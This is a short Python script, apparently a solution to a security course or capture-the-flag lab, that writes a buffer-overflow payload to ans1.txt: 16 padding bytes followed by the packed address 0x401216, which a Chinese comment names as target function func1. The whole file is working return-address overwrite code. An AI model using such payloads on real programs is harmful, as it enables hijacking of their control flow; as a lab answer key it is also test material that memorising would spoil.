import struct

padding = b'A' * 16

# 目标函数 func1 的地址是 0x401216
target_addr = struct.pack('<Q', 0x401216)

payload = padding + target_addr

with open('ans1.txt', 'wb') as f:
    f.write(payload)
